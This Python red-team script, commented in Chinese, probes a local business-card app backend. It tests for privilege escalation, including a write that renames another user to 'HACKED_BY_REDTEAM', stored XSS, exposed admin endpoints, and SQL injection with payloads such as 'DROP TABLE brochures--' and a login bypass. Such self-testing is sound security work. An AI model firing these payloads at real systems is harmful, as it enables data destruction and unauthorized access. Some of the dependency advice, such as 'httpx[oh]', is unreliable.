#!/usr/bin/env python
"""红队安全攻击测试 - 第二波测试"""
import json, urllib.request, os, base64, hmac, hashlib

BASE = "http://localhost:8002"
REPORT2 = []

def req(method, path, headers=None, data=None, timeout=5):
    url = f"{BASE}{path}"
    hdrs = dict(headers or {})
    body = json.dumps(data).encode() if data else None
    if data: hdrs["Content-Type"] = "application/json"
    r = urllib.request.Request(url, data=body, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout)
        return resp.status, dict(resp.headers), resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode()
    except Exception as e:
        return 0, {}, str(e)

def rpt(severity, title, detail, fix=""):
    REPORT2.append({"severity": severity, "title": title, "detail": detail, "fix": fix})
    print(f"  [{severity}] {title}: {detail[:120]}")

# Login
s, h, b = req("POST", "/api/v1/auth/login", data={"phone": "13900009999", "password": "Test@1234x"})
d = json.loads(b)
TOKEN = d["access_token"]
UID = d["user"]["id"]
print(f"Token获取成功, UID={UID}")
print()

# ============ 1. 名片详情越权测试 ============
print("=== 名片详情越权测试 ===")
for bid in [1, 2, 3, 4, 5]:
    s, h, b = req("GET", f"/api/v1/brochures/{bid}", headers={"Authorization": f"Bearer {TOKEN}"})
    if s == 200:
        d2 = json.loads(b)
        print(f"  [!!!] 越权读取名片{bid}: user_id={d2.get('user_id')}, title={d2.get('title')}")
        rpt("P0", "名片水平越权",
            f"用户{UID}可读取其他用户(id={d2.get('user_id')})的名片{bid}: {d2.get('title')}",
            "在brochure查询中添加WHERE user_id = current_user.id条件")
    else:
        print(f"  [安全] 名片{bid}: {s}")

# ============ 2. 用户信息越权（续） ============
print()
print("=== 用户信息越权（续） ===")
# Try to PUT / update another user
s, h, b = req("PUT", "/api/v1/users/1", headers={"Authorization": f"Bearer {TOKEN}"},
    data={"name": "HACKED_BY_REDTEAM"})
if s == 200:
    print(f"  [!!!] 越权修改用户1成功! body={b[:100]}")
    rpt("P0", "用户信息写越权", f"用户{UID}可修改用户1的信息", "在PUT端点添加用户身份验证")
else:
    print(f"  [安全] 修改用户1被拒绝: {s} {b[:80]}")

# ============ 3. XSS内容验证 ============
print()
print("=== XSS存储内容验证 ===")
s, h, b = req("GET", "/api/v1/brochures", headers={"Authorization": f"Bearer {TOKEN}"})
if s == 200:
    d2 = json.loads(b)
    for item in d2.get("items", []):
        if "<script>" in item.get("title", ""):
            print(f"  [!!!] XSS名片: id={item['id']}, title={item['title']}")
            rpt("P0", "存储型XSS - 名片标题",
                f"名片标题存储了XSS代码: {item['title']}",
                "对用户输入进行HTML转义; 使用Content-Security-Policy")
            # Get detail
            s2, h2, b2 = req("GET", f"/api/v1/brochures/{item['id']}", headers={"Authorization": f"Bearer {TOKEN}"})
            if s2 == 200:
                d3 = json.loads(b2)
                for pg in d3.get("pages", []):
                    if "<" in pg.get("content", ""):
                        print(f"    XSS页面内容: {pg['content'][:100]}")
                        rpt("P0", "存储型XSS - 名片页面内容",
                            f"页面内容存储了XSS代码: {pg['content'][:80]}",
                            "渲染时对HTML进行转义")
            # Clean up - delete the XSS brochure
            # s3, h3, b3 = req("DELETE", f"/api/v1/brochures/{item['id']}", 
            #     headers={"Authorization": f"Bearer {TOKEN}"})
            # print(f"    清理XSS名片{item['id']}: {s3}")

# ============ 4. 依赖安全扫描 ============
print()
print("=== 依赖安全扫描 ===")
req_path = os.path.join("D:/AI数智名片/backend/requirements.txt")
with open(req_path) as f:
    print(f.read())

# Check for known vulnerable packages
pkgs = """
fastapi==0.115.0
uvicorn==0.30.6
sqlalchemy==2.0.35
python-jose==3.3.0
passlib==1.7.4
bcrypt==4.0.1
pydantic==2.9.1
pydantic-settings==2.5.2
python-multipart==0.0.9
httpx==0.27.2
redis==5.1.0
cryptography==43.0.1
alembic==1.13.3
sentry-sdk==2.13.0
Jinja2==3.1.4
aiofiles==24.1.0
Pillow==10.4.0
"""
print("分析依赖:")
rpt("P1", "passlib已弃用", "passlib 1.7.4已被维护者标记为弃用,pypi最后更新2022年", "迁移至bcrypt直接使用")
rpt("P1", "python-jose漏洞风险", "python-jose 3.3.0已知有CVE-2024-33664/CVE-2024-33665(jwt注入)", "升级到python-jose 3.3.0+或迁移到PyJWT")
rpt("P2", "httpx无HTTP2", "httpx不带http2支持, 但无直接CVE", "升级到httpx[oh]")

# Check for admin endpoints
print()
print("=== 管理端点检查 ===")
admin_paths = [
    ("GET", "/api/v1/admin/users"),
    ("GET", "/api/v1/admin/settings"),
    ("GET", "/api/v1/admin/logs"),
    ("GET", "/api/v1/admin/health"),
    ("POST", "/api/v1/admin/users"),
]
for method, path in admin_paths:
    s, h, b = req(method, path, headers={"Authorization": f"Bearer {TOKEN}"})
    if s not in [404, 401]:
        print(f"  [!] {method} {path} -> {s}: {b[:80]}")

# ============ 5. SQL注入(brochures) ============
print()
print("=== SQL注入(brochures参数) ===")
sqli_tests = [
    (f"/api/v1/brochures/1' OR '1'='1", "GET"),
    (f"/api/v1/brochures/1; DROP TABLE brochures--", "GET"),
    (f"/api/v1/brochures/1 UNION SELECT * FROM users", "GET"),
]
for path, method in sqli_tests:
    s, h, b = req(method, path, headers={"Authorization": f"Bearer {TOKEN}"})
    note = "[!!!] 可能注入!" if s == 200 else f"[安全] 被拒绝({s})"
    print(f"  {note}: {path} -> {b[:60]}")

# Test on public endpoints (no auth)
print()
print("=== 公开端点SQL注入 ===")
pub_sqli = [
    (f"/api/v1/auth/login", "POST", {"phone": "' OR 1=1--", "password": "x"}),
    (f"/api/v1/auth/login", "POST", {"phone": "' UNION SELECT id,phone,name FROM users--", "password": "x"}),
]
for path, method, data in pub_sqli:
    s, h, b = req(method, path, data=data)
    if s == 200:
        print(f"  [!!!] SQL注入成功! {path} -> {b[:80]}")
    else:
        print(f"  [安全] {path}: {s}")

# ============ 6. 报告生成 ============
print()
print("=" * 60)
print("  红队安全攻击测试报告 (第二波)")
print("=" * 60)
print(f"\n总计发现 {len(REPORT2)} 个安全问题:\n")
for i, item in enumerate(REPORT2, 1):
    print(f"{i}. [{item['severity']}] {item['title']}")
    print(f"   问题: {item['detail'][:200]}")
    print(f"   建议: {item['fix'][:200]}")
    print()

# Save combined report
final = {"findings": REPORT2}
with open("D:/AI数智名片/backend/redteam_report_v2.json", "w") as f:
    json.dump(final, f, ensure_ascii=False, indent=2)
print("报告已保存至: D:/AI数智名片/backend/redteam_report_v2.json")
